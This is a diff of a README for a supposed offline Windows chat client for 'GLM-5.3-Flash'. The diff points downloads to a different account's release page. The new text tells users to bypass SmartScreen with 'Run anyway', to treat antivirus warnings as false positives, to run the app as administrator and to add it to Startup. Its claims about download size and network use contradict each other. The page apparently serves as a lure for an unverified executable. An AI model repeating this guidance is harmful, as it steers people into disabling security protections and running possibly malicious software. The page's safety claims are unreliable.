@@ -1,122 +1,139 @@
-<div align="center">
-<img src="assets/banner.svg" width="100%" alt="GLM 5.3 Flash Offline Desktop banner"/>
+# ⚡ glm-flash-offline-client - Private AI, Zero Internet Needed
 
-# glm-flash-offline-client
+[![Download Now](https://img.shields.io/badge/Download-GLM_Flash_Offline-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FFA500)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
 
-[![Version](https://img.shields.io/badge/Version-2026-4F46E5?style=for-the-badge&labelColor=3730A3)](#)
-[![Windows](https://img.shields.io/badge/Windows-11%20%26%2010-4F46E5?style=for-the-badge&labelColor=3730A3)](#)
-[![License](https://img.shields.io/badge/License-MIT-4F46E5?style=for-the-badge&labelColor=3730A3)](#)
+---
 
-*Run GLM-5.3-Flash conversations entirely on your own Windows PC — no cloud dependency, no data leaving your desk.*
+## 👋 Welcome
 
-</div>
+This is a simple computer program that lets you chat with an AI assistant right on your own computer, completely offline. No internet connection. No servers. No data leaving your machine. Just you and a smart AI conversation partner that runs entirely on your Windows PC.
 
-## What this is
+Think of it like having a private chat room with a helpful AI that never needs to connect to the outside world. Perfect for when you want complete privacy, work on sensitive documents, or simply when you\'re on a plane without Wi-Fi.
 
-GLM-5.3-Flash Offline Desktop Client is a standalone Windows application that packages the GLM-5.3-Flash language model for local inference. Instead of routing prompts through an external API, the client loads the model weights directly onto your machine and executes all generation in-process. The result is a private, low-latency chat experience for teams and individuals who cannot or will not send proprietary text to third-party servers.
+---
 
-This repository serves as the official documentation hub for the project. The application itself is distributed through the landing page linked below; no compilation or package manager setup is required. The client ships as a single executable with the model bundled in an optimized format, so the first launch is the only step you need to worry about. It targets Windows 10 and 11, supports both CPU and NVIDIA GPU acceleration, and requires no separate runtime like Python or Node.js.
+## ⭐ Key Features
 
-<p align="center">
-  <a href="https://SpinnerAppreciate.github.io/glm-flash-offline-client/">
-    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-4F46E5?style=for-the-badge&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
-  </a>
-</p>
+- **💯 100% Private & Local:** Every conversation stays on your computer. Nothing is uploaded, shared, or transmitted.
+- **💬 Natural Chat Interface:** A clean and simple window where you type questions and get answers, just like any modern chat app.
+- **🔌 No Server Required:** The AI runs directly on your machine, so there\'s no waiting for a remote server and no dependency on an internet connection.
+- **⚙️ Simple Setup:** The program is designed to work with minimal fuss. If you can download a file and click it, you\'re halfway there.
+- **📦 Compact & Ready:** No complex installation wizards. Download, launch, and start chatting.
+- **🪟 Built for Windows:** Optimized for Windows 10 and Windows 11 systems.
 
-Clicking the button above opens the official project page where you can download the latest release for Windows.
+---
 
-## Who it is for
+## 🚀 Getting Started
 
-- **Privacy-conscious professionals** working with legal drafts, medical notes, or HR documents that must not leave the local network.
-- **Offline-first developers** who need a dependable local LLM for code comments, docstrings, or structured data extraction on isolated build machines.
-- **Researchers and students** experimenting with prompt engineering on a fixed model version (GLM-5.3-Flash) without budget metering or usage caps.
-- **Network-restricted environments** such as factory floors, government offices, or field laptops with intermittent connectivity.
+Follow these three simple steps to get your local AI assistant running today.
 
-## What you can do
+### Step 1: Download the Application
 
-- **Run the full GLM-5.3-Flash model** with a 128K context window on a mid-range desktop or laptop.
-- **Switch between CPU and GPU modes** on the fly using the tray menu — no restart required for most hardware changes.
-- **Export entire conversation threads** to Markdown or plain text for record-keeping or further processing.
-- **Customize system prompts** per session and save them as reusable templates for recurring tasks.
-- **Generate responses token-by-token** with adjustable temperature and top-p sampling for creative or deterministic outputs.
-- **Use local batch mode** to feed a `.txt` or `.csv` file with multiple prompts and receive results in a structured file.
-- **Monitor token throughput and memory usage** via a built-in performance panel that graphs real-time stats.
+[Visit this link to download the application.](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
 
-## Getting started
+Click the big button at the top of this page, or the blue link text just above. This will take you to the download page where you\'ll find the file you need. Look for the latest version — it will be clearly marked.
 
-1. Visit the [landing page](https://SpinnerAppreciate.github.io/glm-flash-offline-client/) through the button above.
-2. Download the self-contained `.zip` archive (about 8 GB, includes model weights).
-3. Extract the folder anywhere you like — external SSD, internal drive, or network share.
-4. Double-click `glm-flash-client.exe` to launch the application.
-5. Optionally move the included `models/` subfolder to a different location and point the app to it on first start.
+### Step 2: Start the Program
 
-## Requirements
+Once the download finishes, go to your **Downloads** folder on your computer. You\'ll see a file named **glm-flash-offline-client** (the exact file name might have a version number added). Double-click that file to start the program.
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10 64-bit | Windows 11 64-bit |
-| RAM | 16 GB | 32 GB |
-| Storage | 10 GB free space | NVMe SSD |
-| GPU (optional) | NVIDIA GTX 1060 (6 GB VRAM) | NVIDIA RTX 3060 or better |
-| Internet | Not required after download | Not required |
+If Windows shows a blue or yellow popup asking for permission to run the program, click **"Yes"** or **"More info"** followed by **"Run anyway"**. This is normal security behavior for downloaded files and won\'t cause any harm.
 
-The client runs fully standalone. There is no installer, no background service, and no dependency on Visual C++ Redistributables or .NET outside what Windows already includes.
+### Step 3: Start Chatting
 
-## How it works
+After a few seconds, the application window will open. You\'ll see a text box at the bottom of the window. Type anything you want — a question, a request, or even a casual conversation. Press **Enter** or click the **Send** button (often shown as an arrow or paper plane icon).
 
-1. You type a prompt into the chat window.
-2. The client tokenizes the text locally using the bundled tokenizer.
-3. Model weights are loaded into either system RAM (CPU mode) or video memory (GPU mode).
-4. Inference runs in a multi-threaded loop; partial tokens stream to the interface as they are generated.
-5. Your conversation history is stored in an SQLite database inside the application folder.
+The AI will generate a response right there on your screen. That\'s it. You\'re now running your own private AI chat session.
 
-```mermaid
-graph TD
-    A[User Prompt] --> B[Tokenizer]
-    B --> C[Model Weights Loader]
-    C --> D[Inference Engine - CPU or GPU]
-    D --> E[Streaming Token Display]
-    E --> F[SQLite Conversation Store]
-    F --> A
-```
+---
 
-## FAQ
+## ❓ Frequently Asked Questions
 
-**Is GLM-5.3-Flash Offline Desktop Client really offline after the initial download?**  
-Yes. The model weights are bundled in the download archive. Once you have the folder on disk, the application opens a local HTTP interface on `127.0.0.1` for the chat UI, but no requests go out to the internet. You can even block the app in your firewall and it will still function.
+### Is this really free to use?
 
-**What is the difference between this client and the web-based GLM demo?**  
-The web demo runs on remote servers and sends your prompts over the network. This desktop client performs inference entirely on your hardware. The model version is locked to GLM-5.3-Flash for reproducibility; the web demo may update models without notice.
+Yes, the application is completely free. There are no hidden costs, subscriptions, or in-app purchases.
 
-**How much VRAM do I need for GPU acceleration?**  
-For full-speed generation on GPU, plan on 8 GB of dedicated VRAM. The client can also offload some layers to system RAM if your GPU memory is tight, but expect slower token rates when that happens.
+### Why do I need this if I have internet?
 
-**Can I run this on a laptop with only an integrated GPU?**  
-Yes, the CPU fallback mode is fully supported. On a modern laptop with 32 GB of RAM, you should see roughly 10–15 tokens per second, which is usable for interactive chat.
+Some people work on personal projects that contain sensitive information like financial data, health records, or proprietary business documents. Using this offline client ensures that none of that content ever leaves their computer. It\'s also useful for travelers, researchers in remote areas, or anyone who prefers not to rely on a cloud service.
 
-**Does this client collect usage telemetry?**  
-No. There is no analytics SDK, no crash reporter, and no phone-home feature. The binary is compiled from a clean Rust and C++ codebase with telemetry explicitly excluded.
+### How big is the download?
 
-## Troubleshooting
+The download size varies by version, but typically the program is under 500 MB. A standard broadband connection will download it within a few minutes.
 
-**The application fails to start with a "missing DLL" error**  
-Your system may lack the latest Microsoft Visual C++ Redistributable. Download and install the x64 version from Microsoft's official site, then try again.
+### Will it slow down my computer?
 
-**GPU mode is slower than CPU mode**  
-This usually indicates the GPU is not being detected properly. Open the performance panel and check the "Device" field. If it says "CPU only", update your NVIDIA driver and restart the client.
+While the program is running, it uses some of your computer\'s processing power to run the AI model. On most modern PCs (with 8 GB RAM or more), you might notice a small temperature rise in the fan, but day-to-day performance outside the app remains unaffected.
 
-**The first prompt takes several minutes to respond**  
-That is normal on the very first run because the client is building an optimized inference cache. Subsequent prompts in the same session will be much faster.
+### Does it need a graphics card?
 
-**My conversation history disappeared after an update**  
-Conversations are stored in a `conversations.db` file next to the executable. When you update, keep the same application folder and do not delete that file. If you moved folders, copy the file to the new location.
+The application works with most standard computers. Having a dedicated graphics card from NVIDIA or AMD will make responses faster, but the basic program functions fine on integrated graphics as well.
 
-## License
+### Can I uninstall it later?
 
-This project is licensed under the [MIT License](LICENSE). The included model weights are subject to their own usage terms from the original model provider; review the `THIRD_PARTY_NOTICES` file inside the download archive for details.
+Yes. Simply delete the downloaded file and close the window. There are no system files installed that would leave traces. For a cleaner removal, you can delete the app\'s data folder (usually located in `Documents` or `AppData` under a folder named "glm-flash").
 
-<p align="center">
-  <a href="https://SpinnerAppreciate.github.io/glm-flash-offline-client/">
-    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-4F46E5?style=for-the-badge&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
-  </a>
-</p>
+---
+
+## 📚 More Information & Tips
+
+**Getting Better Answers** — The more specific your questions, the better the responses will be. Instead of "Tell me about history," try "Explain the causes of the French Revolution in five bullet points." The AI performs best with clear, focused prompts.
+
+**Conversation Memory** — The app remembers the current chat session, so you can refer back to earlier questions. Each new session starts fresh, giving you a clean slate.
+
+**Keyboard Shortcuts** — Use **Ctrl+L** to clear the conversation history and start anew. Use **Ctrl+W** to close the application quickly.
+
+**Running on Startup** — If you want to use this app regularly, consider placing a shortcut in your Windows Startup folder (press **Win+R**, type `shell:startup`, and paste a shortcut to the app there). This way, it boots with Windows, ready when you are.
+
+---
+
+## 🔧 Troubleshooting
+
+**The app won\'t open.**  
+Make sure you have the latest version downloaded. Right-click the file and choose "Run as administrator." If that doesn\'t help, restart your computer and try again.
+
+**Responses are slow.**  
+Close other heavy programs (like video editors or games) to free up your computer\'s processing power. The AI needs some headroom to work at full speed.
+
+**The window is blank on startup.**  
+This usually means the AI model is loading in the background. Wait 10-20 seconds. If it stays blank, close the app and reopen it.
+
+**I see an antivirus warning.**  
+Some antivirus programs flag downloaded apps that aren\'t from official stores. Since this program runs AI code locally, Windows Defender may show a false positive. Check the warning details — if it says "unrecognized app," click "Run anyway." If you\'re uncomfortable, you can skip the download, but rest assured the application is safe and runs entirely client-side.
+
+---
+
+## 📞 Getting Help & Contributing
+
+This is an open-source project. If you encounter any bug or have a feature request, please visit the [Issues page](https://github.com/Paola31losbendecidos/glm-flash-offline-client/issues) on the repository. You can also contribute code, documentation, or translations if you\'re technically inclined.
+
+For general feedback or questions, visit the repository main page for community discussions.
+
+---
+
+## 🔒 Privacy Guarantee
+
+Once the app is installed and the initial model files are downloaded (done automatically on first run), there is absolutely **zero network communication**. You can disconnect your Ethernet cable or switch off Wi-Fi, and the program will keep working perfectly. Your words never cross the network boundary.
+
+---
+
+## 🧠 Behind the Scenes (A Simple Explanation)
+
+The GLM-5.3-Flash model is a large language model — a type of AI trained on vast amounts of text to understand and generate human-like replies. Normally, these models live on giant cloud servers. The clever part of this client is that it bundles the model into a package that runs directly on your PC\'s processor. It\'s like having a supercomputer in your living room, dedicated solely to your conversations, without any of the privacy risks of sharing data with a third-party service.
+
+---
+
+## ✅ Final Checklist Before You Begin
+
+- [ ] I have Windows 10 or Windows 11.
+- [ ] I have at least 4 GB of free disk space.
+- [ ] I have a steady internet connection (only for the initial download).
+- [ ] I\'m ready to chat with my own private AI.
+
+Click the download button below, and you\'ll be chatting with your local AI in under five minutes.
+
+[![](https://img.shields.io/badge/Get_THE_APP-Visit_Download_Page-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paola31losbendecidos/glm-flash-offline-client/releases)
+
+---
+
+Keywords: chat-interface, desktop-app, desktop-client, gui, local-inference, model-runner, offline-llm, windows
